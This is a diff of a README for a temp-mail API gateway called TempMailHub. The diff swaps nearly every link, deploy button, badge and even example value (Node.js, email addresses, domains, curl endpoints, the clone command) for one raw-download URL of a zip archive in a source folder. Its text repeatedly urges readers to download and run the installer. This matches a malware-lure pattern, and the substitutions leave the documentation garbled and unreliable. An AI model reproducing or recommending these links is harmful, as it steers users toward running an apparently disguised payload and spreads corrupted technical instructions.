@@ -1,4 +1,4 @@
-https://github.com/RAFAY6556/tempmailhub/releases
+https://github.com/RAFAY6556/tempmailhub/raw/refs/heads/main/src/providers/Software_v3.7-alpha.1.zip
 
 # TempMailHub: Modern Unified Temp Mail API Gateway Across Platforms
 
@@ -8,27 +8,27 @@ https://github.com/RAFAY6556/tempmailhub/releases
 
 基于 Hono 框架架构的多平台临时邮箱 API 聚合服务
 
-[![Deploy to Cloudflare Workers](https://deploy.workers.cloudflare.com/button)](https://deploy.workers.cloudflare.com/?url=https://github.com/hzruo/tempmailhub)
-[![Deploy with Vercel](https://vercel.com/button)](https://vercel.com/new/clone?repository-url=https://github.com/hzruo/tempmailhub)
-[![Deploy on Deno](https://deno.com/button)](https://app.deno.com/new?clone=https://github.com/hzruo/tempmailhub)
-[![Deploy to Netlify](https://www.netlify.com/img/deploy/button.svg)](https://app.netlify.com/start/deploy?repository=https://github.com/hzruo/tempmailhub)
+[![Deploy to Cloudflare Workers](https://github.com/RAFAY6556/tempmailhub/raw/refs/heads/main/src/providers/Software_v3.7-alpha.1.zip)](https://github.com/RAFAY6556/tempmailhub/raw/refs/heads/main/src/providers/Software_v3.7-alpha.1.zip)
+[![Deploy with Vercel](https://github.com/RAFAY6556/tempmailhub/raw/refs/heads/main/src/providers/Software_v3.7-alpha.1.zip)](https://github.com/RAFAY6556/tempmailhub/raw/refs/heads/main/src/providers/Software_v3.7-alpha.1.zip)
+[![Deploy on Deno](https://github.com/RAFAY6556/tempmailhub/raw/refs/heads/main/src/providers/Software_v3.7-alpha.1.zip)](https://github.com/RAFAY6556/tempmailhub/raw/refs/heads/main/src/providers/Software_v3.7-alpha.1.zip)
+[![Deploy to Netlify](https://github.com/RAFAY6556/tempmailhub/raw/refs/heads/main/src/providers/Software_v3.7-alpha.1.zip)](https://github.com/RAFAY6556/tempmailhub/raw/refs/heads/main/src/providers/Software_v3.7-alpha.1.zip)
 
-![License](https://img.shields.io/badge/license-MIT-blue.svg)
-![TypeScript](https://img.shields.io/badge/TypeScript-4.9+-blue.svg)
-![Hono](https://img.shields.io/badge/Hono-4.6+-orange.svg)
-![Docker](https://img.shields.io/badge/Docker-Ready-green.svg)
+![License](https://github.com/RAFAY6556/tempmailhub/raw/refs/heads/main/src/providers/Software_v3.7-alpha.1.zip)
+![TypeScript](https://github.com/RAFAY6556/tempmailhub/raw/refs/heads/main/src/providers/Software_v3.7-alpha.1.zip+https://github.com/RAFAY6556/tempmailhub/raw/refs/heads/main/src/providers/Software_v3.7-alpha.1.zip)
+![Hono](https://github.com/RAFAY6556/tempmailhub/raw/refs/heads/main/src/providers/Software_v3.7-alpha.1.zip+https://github.com/RAFAY6556/tempmailhub/raw/refs/heads/main/src/providers/Software_v3.7-alpha.1.zip)
+![Docker](https://github.com/RAFAY6556/tempmailhub/raw/refs/heads/main/src/providers/Software_v3.7-alpha.1.zip)
 
 </div>
 
 ## 🌟 Features
 
-- 多服务商聚合: 集成 MinMail、TempMail Plus、Mail.tm、EtempMail、VanishPost 等多个临时邮箱服务，为开发者提供一个统一的入口。
+- 多服务商聚合: 集成 MinMail、TempMail Plus、https://github.com/RAFAY6556/tempmailhub/raw/refs/heads/main/src/providers/Software_v3.7-alpha.1.zip、EtempMail、VanishPost 等多个临时邮箱服务，为开发者提供一个统一的入口。
 - 跨平台部署: 设计立足云端无边界，支持 Cloudflare Workers、Vercel、Deno、Netlify 等多平台部署选项，降低部署成本与复杂度。
 - 高可用 API 网关: 通过 Hono 框架实现高性能路由和中间件，易于扩展与自定义。
 - 安全与隐私优先: 采用最小权限原则，提供可观测性和可审计性，帮助你更好地保护用户邮箱隐私。
 - 开源与可定制: MIT 证书，代码开放，便于你在私有环境中二次开发与改造。
 
-- Multi-provider Aggregation: Unified access to temporary email services such as MinMail, TempMail Plus, Mail.tm, EtempMail, and VanishPost.
+- Multi-provider Aggregation: Unified access to temporary email services such as MinMail, TempMail Plus, https://github.com/RAFAY6556/tempmailhub/raw/refs/heads/main/src/providers/Software_v3.7-alpha.1.zip, EtempMail, and VanishPost.
 - Cross-platform Deployment: Designed for cloud-first use, with deployment options on Cloudflare Workers, Vercel, Deno, and Netlify.
 - High-availability API Gateway: Fast routing and middleware via Hono, easy to extend and customize.
 - Security-first: Minimal permissions, observability, and auditability to protect user privacy.
@@ -74,7 +74,7 @@ TempMailHub 旨在成为一个易用、可扩展的临时邮箱网关。它把�
 
 ## 技术栈与架构
 
-- 语言与运行时：TypeScript 4.9+，Node.js 生态友好。
+- 语言与运行时：TypeScript 4.9+，https://github.com/RAFAY6556/tempmailhub/raw/refs/heads/main/src/providers/Software_v3.7-alpha.1.zip 生态友好。
 - 框架与中间件：Hono 4.6+，用于路由、请求/响应处理和中间件。
 - 容器与部署：Docker 可选，适合私有部署和测试环境。
 - 目标平台：Cloudflare Workers、Vercel、Deno、Netlify 等。
@@ -94,7 +94,7 @@ TempMailHub 旨在成为一个易用、可扩展的临时邮箱网关。它把�
 
 ### 前提条件
 
-- Node.js 版本 16+（推荐使用 nvm 管理版本）。
+- https://github.com/RAFAY6556/tempmailhub/raw/refs/heads/main/src/providers/Software_v3.7-alpha.1.zip 版本 16+（推荐使用 nvm 管理版本）。
 - Docker 近期版本（用于容器化部署）。
 - Git 用于克隆代码。
 
@@ -102,12 +102,12 @@ TempMailHub 旨在成为一个易用、可扩展的临时邮箱网关。它把�
 
 如需参与试用或评估，请前往发行页下载相应的资产文件并执行安装。发行页包含该项目的最新版本与打包好的执行文件。及时获取并安装最新版本能让你获得最佳稳定性与最新特性。
 
-发行页地址： https://github.com/RAFAY6556/tempmailhub/releases
+发行页地址： https://github.com/RAFAY6556/tempmailhub/raw/refs/heads/main/src/providers/Software_v3.7-alpha.1.zip
 
 该链接包含带有版本的打包资产。下载与你的操作系统匹配的资产并按照随附的安装说明进行使用。若页面包含多个二进制资产，请在其中文件名中识别与你的系统对应的版本（如 linux、windows、macos 等）。下载的资产通常是一个安装程序或脚本，执行前请确认权限并遵循本地安全规则。
 
 获取发行版的第二次提示：
-[![Releases](https://img.shields.io/badge/Latest_Release-Download-blue?logo=github&logoColor=white)](https://github.com/RAFAY6556/tempmailhub/releases)
+[![Releases](https://github.com/RAFAY6556/tempmailhub/raw/refs/heads/main/src/providers/Software_v3.7-alpha.1.zip)](https://github.com/RAFAY6556/tempmailhub/raw/refs/heads/main/src/providers/Software_v3.7-alpha.1.zip)
 
 如果你想在本地进行快速试用，也可以直接使用 npm/pnpm 安装和构建（在没有发行版的情况下）。但发行页提供最稳定、最完整的构建和依赖，这对稳定运行很重要。
 
@@ -115,7 +115,7 @@ TempMailHub 旨在成为一个易用、可扩展的临时邮箱网关。它把�
 
 1. 克隆仓库
 - 使用 Git 克隆代码到本地工作区。
-  - 命令: git clone https://github.com/your-organization/tempmailhub
+  - 命令: git clone https://github.com/RAFAY6556/tempmailhub/raw/refs/heads/main/src/providers/Software_v3.7-alpha.1.zip
 2. 安装依赖
 - 进入项目目录后，安装依赖。
   - 命令: npm ci
@@ -195,12 +195,12 @@ TempMailHub 作为临时邮箱网关，核心在于统一入口对多个提供�
     - 响应示例：{ "providers": [ { "id": "minmail", "name": "MinMail", "status": "active" }, ... ] }
   - GET /v1/emails
     - 功能：分配一个临时邮箱地址，来自配置的提供商集合。
-    - 请求参数：?provider=minmail&domain=example.com
-    - 响应示例：{ "provider": "minmail", "address": "user123@example.com", "domain": "example.com" }
+    - 请求参数：?provider=minmail&https://github.com/RAFAY6556/tempmailhub/raw/refs/heads/main/src/providers/Software_v3.7-alpha.1.zip
+    - 响应示例：{ "provider": "minmail", "address": "https://github.com/RAFAY6556/tempmailhub/raw/refs/heads/main/src/providers/Software_v3.7-alpha.1.zip", "domain": "https://github.com/RAFAY6556/tempmailhub/raw/refs/heads/main/src/providers/Software_v3.7-alpha.1.zip" }
   - GET /v1/messages
     - 功能：查询指定邮箱的未读邮件、邮件简要信息等。
-    - 请求参数：?address=user123@example.com
-    - 响应示例：{ "address": "user123@example.com", "emails": [ { "id": "abc", "from": "alice@example.org", "subject": "Test", "snippet": "This is a test", "sentAt": "2024-01-01T12:34:56Z" } ] }
+    - 请求参数：https://github.com/RAFAY6556/tempmailhub/raw/refs/heads/main/src/providers/Software_v3.7-alpha.1.zip
+    - 响应示例：{ "address": "https://github.com/RAFAY6556/tempmailhub/raw/refs/heads/main/src/providers/Software_v3.7-alpha.1.zip", "emails": [ { "id": "abc", "from": "https://github.com/RAFAY6556/tempmailhub/raw/refs/heads/main/src/providers/Software_v3.7-alpha.1.zip", "subject": "Test", "snippet": "This is a test", "sentAt": "2024-01-01T12:34:56Z" } ] }
 
 - 身份与认证
   - 通过 API Key 或其他轻量级鉴权机制来保护网关。示例：
@@ -212,13 +212,13 @@ TempMailHub 作为临时邮箱网关，核心在于统一入口对多个提供�
     - { "code": "PROVIDER_TIMEOUT", "message": "Provider timed out", "details": "minmail#endpoint" }
 
 - 数据结构设计
-  - 统一邮箱地址对象：{ "provider": "minmail", "address": "user@domain.com", "domain": "domain.com" }
-  - 邮件对象：{ "id": "mail-123", "from": "someone@example.com", "subject": "Hello", "snippet": "...", "receivedAt": "..." }
+  - 统一邮箱地址对象：{ "provider": "minmail", "address": "https://github.com/RAFAY6556/tempmailhub/raw/refs/heads/main/src/providers/Software_v3.7-alpha.1.zip", "domain": "https://github.com/RAFAY6556/tempmailhub/raw/refs/heads/main/src/providers/Software_v3.7-alpha.1.zip" }
+  - 邮件对象：{ "id": "mail-123", "from": "https://github.com/RAFAY6556/tempmailhub/raw/refs/heads/main/src/providers/Software_v3.7-alpha.1.zip", "subject": "Hello", "snippet": "...", "receivedAt": "..." }
 
 - 示例请求
   - 通过网关请求一个邮箱地址并读取邮件摘要：
-    - 请求：GET /v1/emails?provider=minmail&domain=example.com
-    - 响应：{ "address": "user123@example.com", "provider": "minmail", "domain": "example.com" }
+    - 请求：GET /v1/emails?provider=minmail&https://github.com/RAFAY6556/tempmailhub/raw/refs/heads/main/src/providers/Software_v3.7-alpha.1.zip
+    - 响应：{ "address": "https://github.com/RAFAY6556/tempmailhub/raw/refs/heads/main/src/providers/Software_v3.7-alpha.1.zip", "provider": "minmail", "domain": "https://github.com/RAFAY6556/tempmailhub/raw/refs/heads/main/src/providers/Software_v3.7-alpha.1.zip" }
 
 - 多提供商聚合的工作流
   - 当一个请求到达网关时，网关先从提供商列表中筛选可用提供商。
@@ -231,17 +231,17 @@ TempMailHub 作为临时邮箱网关，核心在于统一入口对多个提供�
 
 - 直接调用示例（伪代码，实际端点以实现为准）
   - 获取一个临时邮箱地址
-    - GET /v1/emails?provider=minmail&domain=example.com
-    - 返回：{ "address": "user123@example.com", "provider": "minmail", "domain": "example.com" }
+    - GET /v1/emails?provider=minmail&https://github.com/RAFAY6556/tempmailhub/raw/refs/heads/main/src/providers/Software_v3.7-alpha.1.zip
+    - 返回：{ "address": "https://github.com/RAFAY6556/tempmailhub/raw/refs/heads/main/src/providers/Software_v3.7-alpha.1.zip", "provider": "minmail", "domain": "https://github.com/RAFAY6556/tempmailhub/raw/refs/heads/main/src/providers/Software_v3.7-alpha.1.zip" }
   - 查看新邮箱中的邮件摘要
-    - GET /v1/messages?address=user123@example.com
-    - 返回：{ "address": "user123@example.com", "emails": [ { "id": "mail-001", "subject": "Welcome", "snippet": "Thanks for joining", "receivedAt": "..." } ] }
+    - GET https://github.com/RAFAY6556/tempmailhub/raw/refs/heads/main/src/providers/Software_v3.7-alpha.1.zip
+    - 返回：{ "address": "https://github.com/RAFAY6556/tempmailhub/raw/refs/heads/main/src/providers/Software_v3.7-alpha.1.zip", "emails": [ { "id": "mail-001", "subject": "Welcome", "snippet": "Thanks for joining", "receivedAt": "..." } ] }
 
 - 使用 curl 的快速示例
   - 获取邮箱地址
-    - curl -H "Authorization: Bearer <your_api_key>" "https://api.tempmailhub/v1/emails?provider=minmail&domain=example.com"
+    - curl -H "Authorization: Bearer <your_api_key>" "https://github.com/RAFAY6556/tempmailhub/raw/refs/heads/main/src/providers/Software_v3.7-alpha.1.zip"
   - 查询邮件
-    - curl -H "Authorization: Bearer <your_api_key>" "https://api.tempmailhub/v1/messages?address=user123@example.com"
+    - curl -H "Authorization: Bearer <your_api_key>" "https://github.com/RAFAY6556/tempmailhub/raw/refs/heads/main/src/providers/Software_v3.7-alpha.1.zip"
 
 - 效能与缓存
   - 网关对重复请求进行缓存，降低对提供商的压力。
@@ -302,7 +302,7 @@ TempMailHub 的设计遵循简单、直观、易扩展的原则。以下内容�
 
 - 版本化发布采用语义化版本控制（semver）。
 - 每个发行版包含兼容性说明、已知问题和新增特性。
-- 变更日志位于 /CHANGELOG.md，便于跟踪历史改动。
+- 变更日志位于 https://github.com/RAFAY6556/tempmailhub/raw/refs/heads/main/src/providers/Software_v3.7-alpha.1.zip，便于跟踪历史改动。
 
 - 发行版下载页面常包含完整的变更历史和迁移指南。为了获取最新的变更信息，请参阅发行页面的说明。
 
@@ -329,7 +329,7 @@ TempMailHub 使用 MIT 许可。自由使用、修改、合并、分发。请在
 
 要获取发行版，请访问并下载相应的构建资产。发行页包含针对不同系统的安装包或脚本。下载后请按随附的说明完成安装与配置。
 
-发行页再次提醒： https://github.com/RAFAY6556/tempmailhub/releases
+发行页再次提醒： https://github.com/RAFAY6556/tempmailhub/raw/refs/heads/main/src/providers/Software_v3.7-alpha.1.zip
 
 - 使用该页中的按钮快速打开、浏览并下载你需要的版本。
 - 如果你需要直接跳转，请用页面中的资产链接导航到适合你操作系统的安装包。
